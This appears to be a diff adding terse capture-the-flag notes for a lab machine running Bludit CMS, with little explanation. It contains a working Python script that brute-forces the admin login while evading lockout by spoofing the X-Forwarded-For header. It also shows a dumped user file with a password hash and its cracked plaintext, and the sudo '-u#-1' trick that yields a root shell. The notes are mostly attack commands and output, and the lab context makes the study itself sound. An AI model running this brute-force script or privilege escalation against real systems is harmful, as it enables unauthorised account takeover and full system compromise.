@@ -1,0 +1,114 @@
+found BLUDIT CMS
+
+ffuf for .txt files
+
+todo.txt
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+
+cewl -d 3 http://10.10.10.191 > passwords.cewl
+
+https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+---------------8<----------- modified --------------------------
+
+#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+wordlist = []
+
+with open("passwords.cewl", "r", errors="ignore") as file:
+    for line in file:
+     wordlist.append(line.rstrip())
+
+
+for password in wordlist:
+    print(password)
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+
+---------------8<----------- modified --------------------------
+
+
+
+cat bludit-3.10.0a/bl-content/databases/users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+
+
+crackstation:
+faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120
+
+
+su -l hugo
+
+hugo@blunder:/tmp$ sudo -l
+sudo -l
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+
+
+
+sudo -u#-1 /bin/bash
+
+ifconfig ens33 | fgrep inet | fgrep 10. | awk '{print $2}' &&id
+10.10.10.191
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
